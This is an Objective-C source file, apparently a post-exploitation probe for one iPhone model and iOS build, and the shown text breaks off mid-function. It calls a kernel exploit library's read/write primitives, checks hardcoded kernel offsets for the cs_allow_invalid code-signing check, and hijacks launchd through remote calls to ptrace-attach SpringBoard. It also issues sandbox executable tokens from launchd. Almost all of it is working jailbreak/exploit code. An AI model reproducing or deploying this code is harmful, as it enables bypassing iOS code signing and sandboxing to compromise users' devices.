#import <Foundation/Foundation.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import "CNDPhysicalCSAllowInvalidProbe.h"

#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/machine.h>
#include <mach-o/fat.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

extern int ptrace(int request, pid_t pid, caddr_t address, int data);

#ifndef CND_PHYSICAL_PROBE_ARMED
#define CND_PHYSICAL_PROBE_ARMED 0
#endif

#ifndef CND_PHYSICAL_PROBE_NONCE
#define CND_PHYSICAL_PROBE_NONCE "unconfigured"
#endif

/* Exact iPhone17,2 (iPhone 16 Pro Max) / 23A341 release-kernel facts. */
#define CND_EXPECTED_BUILD "23A341"
#define CND_UNSLID_KERNEL_BASE UINT64_C(0xfffffff007004000)
#define CND_CS_ALLOW_INVALID_OFFSET UINT64_C(0x016e2b68)
#define CND_PTRACE_ATTACHEXC_CALLS_OFFSET UINT64_C(0x0175d928)
#define CND_KERNEL_OBJECT_MIN UINT64_C(0xffffffdc00000000)
#define CND_KERNEL_OBJECT_MAX UINT64_C(0xfffffffbffffffff)

#define CND_PT_ATTACHEXC 14
#define CND_PT_TRACE_ME 0
#define CND_PT_DETACH 11
#define CND_PT_KILL 8
#define CND_CS_OPS_STATUS 0
#define CND_CS_DEBUGGED UINT32_C(0x10000000)
#define CND_REMOTE_TIMEOUT_SECONDS 5
#define CND_MAC_LABEL_SIZE UINT32_C(0x20)
#define CND_SPRINGBOARD_DYLIB_PROBE_NAME "CNDSpringBoardDylibProbe.dylib"
#define CND_SPRINGBOARD_DYLIB_PROBE_SYMBOL "cnd_springboard_dylib_probe"
#define CND_SPRINGBOARD_DYLIB_CHALLENGE UINT64_C(0x5a17c0decafebeef)
#define CND_SPRINGBOARD_DYLIB_COOKIE UINT64_C(0x434e4453594c4942)

static const uint8_t kCNDCSAllowInvalidPrologue[] = {
    0x7f, 0x23, 0x03, 0xd5, /* pacibsp */
    0xe9, 0x23, 0xbb, 0x6d,
    0xf8, 0x5f, 0x01, 0xa9,
    0xf6, 0x57, 0x02, 0xa9,
    0xf4, 0x4f, 0x03, 0xa9,
    0xfd, 0x7b, 0x04, 0xa9,
    0xfd, 0x03, 0x01, 0x91,
    0xf3, 0x03, 0x00, 0xaa, /* mov x19, x0 */
};

static const uint32_t kCNDRXNonceCode[] = {
    UINT32_C(0xd503245f), /* bti c */
    UINT32_C(0xd2981bc0), /* mov x0, #0xc0de */
    UINT32_C(0xd65f03c0), /* ret */
};

typedef uint64_t (*CNDProcFindByNameFn)(const char *name);
typedef uint64_t (*CNDProcSelfFn)(void);
typedef uint64_t (*CNDProcGetCredLabelFn)(uint64_t proc);
typedef uint64_t (*CNDAmfiCslotGetFn)(uint64_t label);
typedef void (*CNDKReadBufFn)(uint64_t address, void *buffer, uint64_t length);
typedef uint64_t (*CNDKRead64Fn)(uint64_t address);
typedef bool (*CNDKWrite32BytesCheckedFn)(uint64_t address,
    const uint8_t bytes[CND_MAC_LABEL_SIZE]);
typedef int (*CNDKexploitFn)(void);
typedef bool (*CNDKRWReadyFn)(void);
typedef bool (*CNDKRWCleanupFn)(void);
typedef void (*CNDRemoteWithSessionFn)(id session, void (^block)(void));
typedef bool (*CNDRemoteSuccessFn)(void);
typedef int (*CNDRemoteCurrentPIDFn)(void);
typedef uint64_t (*CNDRemoteCurrentProcFn)(void);
typedef uint64_t (*CNDRemoteCurrentTaskFn)(void);
typedef uint64_t (*CNDRDlsymCallFn)(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);

typedef struct {
    pid_t pid;
    uint64_t proc;
    uint64_t task;
} CNDProbeTargetIdentity;

typedef struct {
    uint64_t sliceOffset;
    uint64_t textFileOffset;
    uint64_t textFileSize;
    uint64_t textVMAddress;
    uint64_t symbolOffset;
} CNDProbeDylibLayout;

@interface CNDProbeRemoteCallSession : NSObject
@property(nonatomic, readonly) uint64_t taskAddr;
@property(nonatomic, readonly) int pid;
- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS;
- (instancetype)initWithIdentityBootstrapProcess:(NSString *)process
                          firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS;
- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
              originalThreadOnly:(BOOL)originalThreadOnly
            bootstrapThreadCount:(int)bootstrapThreadCount
               bootstrapProvoker:(void (^)(void))bootstrapProvoker;
- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                          functionAddress:(uint64_t)address
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7;
- (BOOL)remoteWrite:(uint64_t)destination
               from:(const void *)source
               size:(uint64_t)size;
- (BOOL)remoteRead:(uint64_t)source
                to:(void *)destination
              size:(uint64_t)size;
- (int)destroyRemoteCall;
- (void)abandonRemoteCall;
- (BOOL)hasLocalState;
- (BOOL)hasInFlightSyntheticCall;
- (BOOL)deferTeardownForInFlightSyntheticCall;
- (int)dispatchSelfSIGKILLForExpectedPID:(int)expectedPID
                                    proc:(uint64_t)expectedProc
                                    task:(uint64_t)expectedTask
                                  report:(void *)report;
@end

typedef struct {
    CNDProcFindByNameFn procFindByName;
    CNDProcSelfFn procSelf;
    CNDProcGetCredLabelFn procGetCredLabel;
    CNDAmfiCslotGetFn amfiCslotGet;
    CNDKReadBufFn kreadbuf;
    CNDKRead64Fn kread64;
    CNDKWrite32BytesCheckedFn kwrite32BytesChecked;
    CNDKexploitFn kexploit;
    CNDKRWReadyFn krwReady;
    CNDKRWCleanupFn krwCleanup;
    CNDRemoteWithSessionFn withSession;
    CNDRemoteSuccessFn remoteSuccess;
    CNDRemoteCurrentPIDFn remoteCurrentPID;
    CNDRemoteCurrentProcFn remoteCurrentProc;
    CNDRemoteCurrentTaskFn remoteCurrentTask;
    CNDRDlsymCallFn remoteDlsymCall;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint32_t *amfiSlotOffset;
    Class remoteSessionClass;
} CNDProbeAPI;

static int CNDReadRemoteErrno(const CNDProbeAPI *api,
    CNDProbeRemoteCallSession *session);
static bool CNDWaitForIdentityExit(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask);

static NSMutableDictionary<NSString *, id> *gCNDReport;
static NSString *gCNDReportPath;
static CNDKRWCleanupFn gCNDKRWCleanup;
static bool gCNDKRWAcquisitionAttempted;
static bool gCNDProbeTerminateHostAfterRun;
static volatile int32_t gCNDProbeRunActive;

static void CNDRecord(NSString *key, id value)
{
    if (!key || !value || !gCNDReport) return;
    @synchronized (gCNDReport) {
        gCNDReport[key] = value;
        gCNDReport[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
        NSData *data = [NSJSONSerialization dataWithJSONObject:gCNDReport
            options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
            error:nil];
        if (data && gCNDReportPath) {
            (void)[data writeToFile:gCNDReportPath
                options:NSDataWritingAtomic error:nil];
        }
    }
    NSLog(@"[CND_CS_INVALID] %@=%@", key, value);
}

static NSString *CNDHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSString *CNDOSBuild(void)
{
    char build[64] = {0};
    size_t size = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &size, NULL, 0) != 0 ||
        build[0] == '\0') return @"";
    return [NSString stringWithUTF8String:build] ?: @"";
}

static bool CNDKernelPointer(uint64_t value)
{
    return (value & UINT64_C(0xfffffff000000000)) ==
        UINT64_C(0xfffffff000000000);
}

static bool CNDKernelObjectPointer(uint64_t value)
{
    return value >= CND_KERNEL_OBJECT_MIN && value <= CND_KERNEL_OBJECT_MAX;
}

static bool CNDRangeFits(uint64_t offset, uint64_t length,
    uint64_t capacity)
{
    return offset <= capacity && length <= capacity - offset;
}

static uint32_t CNDBigToHost32(uint32_t value)
{
#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
    return __builtin_bswap32(value);
#else
    return value;
#endif
}

static bool CNDResolveProbeDylibLayout(NSString *path,
    CNDProbeDylibLayout *layoutOut)
{
    if (!path || !layoutOut) return false;
    memset(layoutOut, 0, sizeof(*layoutOut));
    NSData *data = [NSData dataWithContentsOfFile:path
        options:NSDataReadingMappedIfSafe error:nil];
    if (data.length < sizeof(struct fat_header)) return false;

    const uint8_t *bytes = data.bytes;
    uint64_t length = data.length;
    const struct fat_header *fat = (const struct fat_header *)bytes;
    bool swap = fat->magic == FAT_CIGAM;
    if (!swap && fat->magic != FAT_MAGIC) return false;
    uint32_t architectureCount = swap
        ? CNDBigToHost32(fat->nfat_arch) : fat->nfat_arch;
    if (!architectureCount || architectureCount > 16 ||
        !CNDRangeFits(sizeof(*fat),
            (uint64_t)architectureCount * sizeof(struct fat_arch), length)) {
        return false;
    }

    uint64_t sliceOffset = 0;
    uint64_t sliceSize = 0;
    const struct fat_arch *architectures =
        (const struct fat_arch *)(bytes + sizeof(*fat));
    for (uint32_t index = 0; index < architectureCount; index++) {
        uint32_t cpuType = swap
            ? CNDBigToHost32((uint32_t)architectures[index].cputype)
            : (uint32_t)architectures[index].cputype;
        uint32_t cpuSubtype = swap
            ? CNDBigToHost32((uint32_t)architectures[index].cpusubtype)
            : (uint32_t)architectures[index].cpusubtype;
        if (cpuType != CPU_TYPE_ARM64 ||
            (cpuSubtype & ~CPU_SUBTYPE_MASK) != CPU_SUBTYPE_ARM64E) {
            continue;
        }
        sliceOffset = swap
            ? CNDBigToHost32(architectures[index].offset)
            : architectures[index].offset;
        sliceSize = swap
            ? CNDBigToHost32(architectures[index].size)
            : architectures[index].size;
        break;
    }
    if (!sliceOffset || !sliceSize ||
        !CNDRangeFits(sliceOffset, sliceSize, length) ||
        sliceSize < sizeof(struct mach_header_64)) return false;

    const struct mach_header_64 *header =
        (const struct mach_header_64 *)(bytes + sliceOffset);
    if (header->magic != MH_MAGIC_64 ||
        header->cputype != CPU_TYPE_ARM64 ||
        (header->cpusubtype & ~CPU_SUBTYPE_MASK) != CPU_SUBTYPE_ARM64E ||
        !CNDRangeFits(sizeof(*header), header->sizeofcmds, sliceSize)) {
        return false;
    }

    const struct segment_command_64 *text = NULL;
    const struct symtab_command *symtab = NULL;
    uint64_t commandOffset = sizeof(*header);
    for (uint32_t index = 0; index < header->ncmds; index++) {
        if (!CNDRangeFits(commandOffset, sizeof(struct load_command),
                sliceSize)) return false;
        const struct load_command *command =
            (const struct load_command *)(bytes + sliceOffset + commandOffset);
        if (command->cmdsize < sizeof(*command) ||
            !CNDRangeFits(commandOffset, command->cmdsize, sliceSize)) {
            return false;
        }
        if (command->cmd == LC_SEGMENT_64 &&
            command->cmdsize >= sizeof(struct segment_command_64)) {
            const struct segment_command_64 *segment =
                (const struct segment_command_64 *)command;
            if (strncmp(segment->segname, SEG_TEXT,
                    sizeof(segment->segname)) == 0) text = segment;
        } else if (command->cmd == LC_SYMTAB &&
                   command->cmdsize >= sizeof(struct symtab_command)) {
            symtab = (const struct symtab_command *)command;
        }
        commandOffset += command->cmdsize;
    }
    if (!text || !symtab || !text->filesize ||
        !CNDRangeFits(text->fileoff, text->filesize, sliceSize) ||
        !CNDRangeFits(symtab->symoff,
            (uint64_t)symtab->nsyms * sizeof(struct nlist_64), sliceSize) ||
        !CNDRangeFits(symtab->stroff, symtab->strsize, sliceSize)) {
        return false;
    }

    const struct nlist_64 *symbols = (const struct nlist_64 *)(
        bytes + sliceOffset + symtab->symoff);
    const char *strings = (const char *)(
        bytes + sliceOffset + symtab->stroff);
    const char expected[] = "_" CND_SPRINGBOARD_DYLIB_PROBE_SYMBOL;
    uint64_t symbolOffset = UINT64_MAX;
    for (uint32_t index = 0; index < symtab->nsyms; index++) {
        uint32_t stringOffset = symbols[index].n_un.n_strx;
        if (stringOffset >= symtab->strsize) continue;
        const char *name = strings + stringOffset;
        size_t remaining = symtab->strsize - stringOffset;
        if (!memchr(name, '\0', remaining)) continue;
        if (strcmp(name, expected) == 0 &&
            symbols[index].n_value >= text->vmaddr &&
            symbols[index].n_value < text->vmaddr + text->vmsize) {
            symbolOffset = symbols[index].n_value - text->vmaddr;
            break;
        }
    }
    if (symbolOffset == UINT64_MAX || symbolOffset >= text->filesize) {
        return false;
    }

    layoutOut->sliceOffset = sliceOffset;
    layoutOut->textFileOffset = text->fileoff;
    layoutOut->textFileSize = text->filesize;
    layoutOut->textVMAddress = text->vmaddr;
    layoutOut->symbolOffset = symbolOffset;
    return true;
}

static bool CNDResolveAPI(CNDProbeAPI *api)
{
    if (!api) return false;
    memset(api, 0, sizeof(*api));
#define CND_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(RTLD_DEFAULT, name)
    CND_RESOLVE(procFindByName, "proc_find_by_name");
    CND_RESOLVE(procSelf, "proc_self");
    CND_RESOLVE(procGetCredLabel, "proc_get_cred_label");
    CND_RESOLVE(amfiCslotGet, "amfi_cslot_get");
    CND_RESOLVE(kreadbuf, "kreadbuf");
    CND_RESOLVE(kread64, "kread64");
    CND_RESOLVE(kwrite32BytesChecked,
        "kexploit_early_kwrite32bytes_checked");
    CND_RESOLVE(kexploit, "kexploit_opa334");
    CND_RESOLVE(krwReady, "kexploit_krw_ready");
    CND_RESOLVE(krwCleanup, "kexploit_terminal_cleanup");
    CND_RESOLVE(withSession, "remote_call_with_session");
    CND_RESOLVE(remoteSuccess, "remote_call_current_success");
    CND_RESOLVE(remoteCurrentPID, "remote_call_current_pid");
    CND_RESOLVE(remoteCurrentProc, "remote_call_current_proc");
    CND_RESOLVE(remoteCurrentTask, "remote_call_current_task");
    CND_RESOLVE(remoteDlsymCall, "r_dlsym_call");
    CND_RESOLVE(kernelBase, "g_kernel_base");
    CND_RESOLVE(kernelSlide, "g_kernel_slide");
    CND_RESOLVE(amfiSlotOffset, "off_label_l_perpolicy_amfi");
#undef CND_RESOLVE
    api->remoteSessionClass = NSClassFromString(@"RemoteCallSession");
    return api->procFindByName && api->procSelf &&
        api->procGetCredLabel && api->amfiCslotGet &&
        api->kreadbuf && api->kread64 && api->kwrite32BytesChecked &&
        api->kexploit && api->krwReady &&
        api->krwCleanup && api->withSession && api->remoteSuccess &&
        api->remoteCurrentPID && api->remoteCurrentProc &&
        api->remoteCurrentTask &&
        api->remoteDlsymCall && api->kernelBase && api->kernelSlide &&
        api->amfiSlotOffset &&
        api->remoteSessionClass;
}

static uint64_t CNDDecodeBLTarget(uint64_t instructionAddress,
    uint32_t instruction)
{
    if ((instruction & UINT32_C(0xfc000000)) != UINT32_C(0x94000000)) {
        return 0;
    }
    int64_t displacement = (int64_t)(instruction & UINT32_C(0x03ffffff));
    if ((displacement & INT64_C(0x02000000)) != 0) {
        displacement |= ~INT64_C(0x03ffffff);
    }
    displacement <<= 2;
    return (uint64_t)((int64_t)instructionAddress + displacement);
}

static bool CNDVerifyExactKernel(const CNDProbeAPI *api)
{
    if (!api || !api->kernelBase || !api->kernelSlide ||
        !CNDKernelPointer(*api->kernelBase)) return false;
    uint64_t expectedBase = CND_UNSLID_KERNEL_BASE + *api->kernelSlide;
    if (*api->kernelBase != expectedBase) {
        CNDRecord(@"kernelIdentityFailure", [NSString stringWithFormat:
            @"base %@ does not equal unslid+slide %@",
            CNDHex(*api->kernelBase), CNDHex(expectedBase)]);
        return false;
    }

    uint64_t function = *api->kernelBase + CND_CS_ALLOW_INVALID_OFFSET;
    uint8_t prologue[sizeof(kCNDCSAllowInvalidPrologue)] = {0};
    api->kreadbuf(function, prologue, sizeof(prologue));
    if (memcmp(prologue, kCNDCSAllowInvalidPrologue, sizeof(prologue)) != 0) {
        CNDRecord(@"kernelIdentityFailure",
            @"cs_allow_invalid prologue mismatch");
        return false;
    }

    uint64_t calls = *api->kernelBase + CND_PTRACE_ATTACHEXC_CALLS_OFFSET;
    uint32_t words[5] = {0};
    api->kreadbuf(calls, words, sizeof(words));
    bool callShape = words[0] == UINT32_C(0xaa1303e0) &&
        words[2] == UINT32_C(0xaa1503e0) &&
        CNDDecodeBLTarget(calls + 4, words[1]) == function &&
        CNDDecodeBLTarget(calls + 12, words[3]) == function &&
        words[4] == UINT32_C(0xaa1303e0);
    if (!callShape) {
        CNDRecord(@"kernelIdentityFailure",
            @"PT_ATTACHEXC callsites do not resolve to cs_allow_invalid");
        return false;
    }
    CNDRecord(@"ptraceAttachAllowsTargetAndTracer", @YES);
    CNDRecord(@"csAllowInvalidRuntimeAddress", CNDHex(function));
    CNDRecord(@"kernelIdentityVerified", @YES);
    return true;
}

static bool CNDIdentityMatches(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask)
{
    /* RemoteCall already validates proc/task with its canonical
     * is_kaddr_valid() gate. Do not impose a second address-range model here:
     * iOS 26 kernel heap objects legitimately live outside kernel text. */
    if (!api || pid <= 1 || !expectedProc || expectedProc == UINT64_MAX ||
        !expectedTask || expectedTask == UINT64_MAX) return false;
    return api->procFindByName("SpringBoard") == expectedProc;
}

static CNDProbeRemoteCallSession *CNDCreateSpringBoardSession(
    const CNDProbeAPI *api)
{
    if (!api || !api->remoteSessionClass) return nil;
    return [[(id)api->remoteSessionClass alloc]
        initWithIdentityBootstrapProcess:@"SpringBoard"
        firstExceptionTimeoutMS:10000];
}

static bool CNDCopySpringBoardSessionIdentity(const CNDProbeAPI *api,
    CNDProbeRemoteCallSession *session,
    CNDProbeTargetIdentity *identityOut)
{
    if (!api || !session || !identityOut) return false;
    memset(identityOut, 0, sizeof(*identityOut));

    __block CNDProbeTargetIdentity current = {0};
    api->withSession(session, ^{
        current.pid = (pid_t)api->remoteCurrentPID();
        current.proc = api->remoteCurrentProc();
        current.task = api->remoteCurrentTask();
    });
    *identityOut = current;
    bool bound = current.pid > 1 &&
        session.pid == current.pid &&
        session.taskAddr == current.task &&
        CNDIdentityMatches(api, current.pid, current.proc, current.task);
    return bound;
}

static bool CNDTeardownRemoteCallSession(
    CNDProbeRemoteCallSession *session)
{
    if (!session) return true;
    if ([session hasInFlightSyntheticCall]) {
        (void)[session deferTeardownForInFlightSyntheticCall];
    } else if ([session hasLocalState]) {
        (void)[session destroyRemoteCall];
    }
    return ![session hasLocalState];
}

static bool CNDEnableSpringBoardThroughLaunchdAttach(
    const CNDProbeAPI *api, pid_t springBoardPID,
    uint64_t expectedProc, uint64_t expectedTask)
{
    if (!api || springBoardPID <= 1 ||
        !CNDIdentityMatches(api, springBoardPID,
            expectedProc, expectedTask)) return false;
    CNDProbeRemoteCallSession *session = [[(id)api->remoteSessionClass alloc]
        initWithProcess:@"launchd"
        useMigFilterBypass:NO
        firstExceptionTimeoutMS:10000];
    if (!session) {
        CNDRecord(@"launchdAttachSessionOpened", @NO);
        return false;
    }
    CNDRecord(@"launchdAttachSessionOpened", @YES);

    __block int launchdPID = 0;
    __block uint64_t launchdProc = 0;
    __block uint64_t launchdTask = 0;
    __block int64_t attachResult = -1;
    __block int attachErrno = 0;
    __block int64_t waitResult = -1;
    __block int waitErrno = 0;
    __block int waitStatus = 0;
    __block bool stopped = false;
    __block int64_t detachResult = -1;
    __block int detachErrno = 0;
    __block int64_t continueResult = 0;
    __block int continueErrno = 0;
    __block bool healthy = false;
    @try {
        api->withSession(session, ^{
            launchdPID = api->remoteCurrentPID();
            launchdProc = api->remoteCurrentProc();
            launchdTask = api->remoteCurrentTask();
            if (launchdPID != 1 || !launchdProc || !launchdTask ||
                !CNDIdentityMatches(api, springBoardPID,
                    expectedProc, expectedTask)) return;

            uint64_t remoteStatus = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "malloc", sizeof(int),
                0, 0, 0, 0, 0, 0, 0);
            if (!remoteStatus || !api->remoteSuccess()) return;
            attachResult = (int64_t)api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "ptrace",
                CND_PT_ATTACHEXC, (uint64_t)springBoardPID,
                0, 0, 0, 0, 0, 0);
            if (attachResult < 0 && api->remoteSuccess()) {
                attachErrno = CNDReadRemoteErrno(api, session);
            }
            if (attachResult == 0 && api->remoteSuccess()) {
                for (unsigned int attempt = 0; attempt < 30; attempt++) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "memset",
                        remoteStatus, 0, sizeof(int), 0, 0, 0, 0, 0);
                    waitResult = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "waitpid",
                        (uint64_t)springBoardPID, remoteStatus,
                        WNOHANG | WUNTRACED, 0, 0, 0, 0, 0);
                    if (waitResult == springBoardPID &&
                        [session remoteRead:remoteStatus
                            to:&waitStatus size:sizeof(waitStatus)]) {
                        stopped = WIFSTOPPED(waitStatus);
                        if (stopped) break;
                    } else if (waitResult < 0 && api->remoteSuccess()) {
                        waitErrno = CNDReadRemoteErrno(api, session);
                        break;
                    }
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "usleep", 50000,
                        0, 0, 0, 0, 0, 0, 0);
                }
                if (!stopped && api->remoteSuccess()) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "kill",
                        (uint64_t)springBoardPID, SIGSTOP,
                        0, 0, 0, 0, 0, 0);
                }
                for (unsigned int attempt = 0; attempt < 5; attempt++) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "usleep",
                        attempt == 0 ? 100000 : 50000,
                        0, 0, 0, 0, 0, 0, 0);
                    detachResult = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "ptrace",
                        CND_PT_DETACH, (uint64_t)springBoardPID,
                        0, 0, 0, 0, 0, 0);
                    if (detachResult == 0) {
                        detachErrno = 0;
                        break;
                    }
                    detachErrno = CNDReadRemoteErrno(api, session);
                    if (detachErrno != EBUSY) break;
                }
                if (detachResult != 0 && api->remoteSuccess()) {
                    continueResult = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "kill",
                        (uint64_t)springBoardPID, SIGCONT,
                        0, 0, 0, 0, 0, 0);
                    if (continueResult < 0 && api->remoteSuccess()) {
                        continueErrno = CNDReadRemoteErrno(api, session);
                    }
                }
            }
            if (remoteStatus && api->remoteSuccess()) {
                (void)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "free", remoteStatus,
                    0, 0, 0, 0, 0, 0, 0);
            }
            healthy = api->remoteSuccess();
        });
    } @catch (NSException *exception) {
        CNDRecord(@"launchdAttachException", [NSString stringWithFormat:
            @"%@:%@", exception.name ?: @"exception",
            exception.reason ?: @"unknown"]);
    }

    bool identity = session.pid == 1 && launchdPID == 1 &&
        launchdProc && launchdTask;
    bool closed = CNDTeardownRemoteCallSession(session);
    bool targetStable = CNDIdentityMatches(
        api, springBoardPID, expectedProc, expectedTask);
    CNDRecord(@"launchdAttachIdentityBound", @(identity));
    CNDRecord(@"launchdAttachResult", @(attachResult));
    CNDRecord(@"launchdAttachErrno", @(attachErrno));
    CNDRecord(@"launchdAttachWaitResult", @(waitResult));
    CNDRecord(@"launchdAttachWaitErrno", @(waitErrno));
    CNDRecord(@"launchdAttachWaitStatus", @(waitStatus));
    CNDRecord(@"launchdAttachStopObserved", @(stopped));
    CNDRecord(@"launchdAttachDetachResult", @(detachResult));
    CNDRecord(@"launchdAttachDetachErrno", @(detachErrno));
    CNDRecord(@"launchdAttachContinueResult", @(continueResult));
    CNDRecord(@"launchdAttachContinueErrno", @(continueErrno));
    CNDRecord(@"launchdAttachTransportHealthy", @(healthy));
    CNDRecord(@"launchdAttachSessionClosed", @(closed));
    CNDRecord(@"launchdAttachTargetIdentityStable", @(targetStable));
    return identity && attachResult == 0 && detachResult == 0 &&
        healthy && closed && targetStable;
}

static bool CNDFinishSpringBoardSelfTraceViaLaunchd(
    const CNDProbeAPI *api, pid_t springBoardPID,
    int64_t *stopResultOut, int *stopErrnoOut,
    int64_t *detachResultOut, int *detachErrnoOut,
    int64_t *continueResultOut, int *continueErrnoOut)
{
    if (stopResultOut) *stopResultOut = -1;
    if (stopErrnoOut) *stopErrnoOut = 0;
    if (detachResultOut) *detachResultOut = -1;
    if (detachErrnoOut) *detachErrnoOut = 0;
    if (continueResultOut) *continueResultOut = 0;
    if (continueErrnoOut) *continueErrnoOut = 0;
    if (!api || springBoardPID <= 1) return false;

    CNDProbeRemoteCallSession *session = [[(id)api->remoteSessionClass alloc]
        initWithProcess:@"launchd"
        useMigFilterBypass:NO
        firstExceptionTimeoutMS:10000];
    if (!session) {
        CNDRecord(@"selfTraceLaunchdSessionOpened", @NO);
        return false;
    }
    CNDRecord(@"selfTraceLaunchdSessionOpened", @YES);

    __block int launchdPID = 0;
    __block uint64_t launchdProc = 0;
    __block uint64_t launchdTask = 0;
    __block int64_t stopResult = -1;
    __block int stopErrno = 0;
    __block int64_t detachResult = -1;
    __block int detachErrno = 0;
    __block int64_t continueResult = 0;
    __block int continueErrno = 0;
    __block bool healthy = false;
    @try {
        api->withSession(session, ^{
            launchdPID = api->remoteCurrentPID();
            launchdProc = api->remoteCurrentProc();
            launchdTask = api->remoteCurrentTask();
            if (launchdPID != 1 || !launchdProc || !launchdTask) return;

            stopResult = (int64_t)api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "kill",
                (uint64_t)springBoardPID, SIGSTOP,
                0, 0, 0, 0, 0, 0);
            if (stopResult < 0 && api->remoteSuccess()) {
                stopErrno = CNDReadRemoteErrno(api, session);
            }
            if (stopResult == 0 && api->remoteSuccess()) {
                for (unsigned int attempt = 0; attempt < 5; attempt++) {
                    (void)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "usleep",
                        attempt == 0 ? 100000 : 50000,
                        0, 0, 0, 0, 0, 0, 0);
                    detachResult = (int64_t)api->remoteDlsymCall(
                        CND_REMOTE_TIMEOUT_SECONDS, "ptrace",
                        CND_PT_DETACH, (uint64_t)springBoardPID,
                        0, 0, 0, 0, 0, 0);
                    if (detachResult == 0) {
                        detachErrno = 0;
                        break;
                    }
                    detachErrno = CNDReadRemoteErrno(api, session);
                    if (detachErrno != EBUSY) break;
                }
            }
            if (detachResult != 0 && api->remoteSuccess()) {
                continueResult = (int64_t)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "kill",
                    (uint64_t)springBoardPID, SIGCONT,
                    0, 0, 0, 0, 0, 0);
                if (continueResult < 0 && api->remoteSuccess()) {
                    continueErrno = CNDReadRemoteErrno(api, session);
                }
            }
            healthy = api->remoteSuccess();
        });
    } @catch (NSException *exception) {
        CNDRecord(@"selfTraceLaunchdException", [NSString stringWithFormat:
            @"%@:%@", exception.name ?: @"exception",
            exception.reason ?: @"unknown"]);
    }

    bool identity = session.pid == 1 && launchdPID == 1 &&
        launchdProc && launchdTask;
    bool closed = CNDTeardownRemoteCallSession(session);
    if (stopResultOut) *stopResultOut = stopResult;
    if (stopErrnoOut) *stopErrnoOut = stopErrno;
    if (detachResultOut) *detachResultOut = detachResult;
    if (detachErrnoOut) *detachErrnoOut = detachErrno;
    if (continueResultOut) *continueResultOut = continueResult;
    if (continueErrnoOut) *continueErrnoOut = continueErrno;
    CNDRecord(@"selfTraceLaunchdIdentityBound", @(identity));
    CNDRecord(@"selfTraceLaunchdTransportHealthy", @(healthy));
    CNDRecord(@"selfTraceLaunchdSessionClosed", @(closed));
    return identity && healthy && closed &&
        stopResult == 0 && detachResult == 0;
}

static NSData *CNDIssueExecutableToken(const CNDProbeAPI *api,
    NSString *path)
{
    if (!api || path.length == 0) return nil;
    CNDProbeRemoteCallSession *session = [[(id)api->remoteSessionClass alloc]
        initWithProcess:@"launchd"
        useMigFilterBypass:NO
        firstExceptionTimeoutMS:10000];
    if (!session) {
        CNDRecord(@"executableGrantLaunchdSessionOpened", @NO);
        return nil;
    }
    CNDRecord(@"executableGrantLaunchdSessionOpened", @YES);

    __block int launchdPID = 0;
    __block uint64_t launchdProc = 0;
    __block uint64_t launchdTask = 0;
    __block NSMutableData *token = nil;
    __block bool healthy = false;
    @try {
        api->withSession(session, ^{
            launchdPID = api->remoteCurrentPID();
            launchdProc = api->remoteCurrentProc();
            launchdTask = api->remoteCurrentTask();
            const char *tokenClass = "com.apple.sandbox.executable";
            const char *localPath = path.fileSystemRepresentation;
            size_t classLength = strlen(tokenClass) + 1;
            size_t pathLength = localPath ? strlen(localPath) + 1 : 0;
            uint64_t remoteClass = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "malloc", classLength,
                0, 0, 0, 0, 0, 0, 0);
            uint64_t remotePath = pathLength ? api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "malloc", pathLength,
                0, 0, 0, 0, 0, 0, 0) : 0;
            if (remoteClass && remotePath && api->remoteSuccess()) {
                (void)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "memset", remoteClass,
                    0, classLength, 0, 0, 0, 0, 0);
                (void)api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "memset", remotePath,
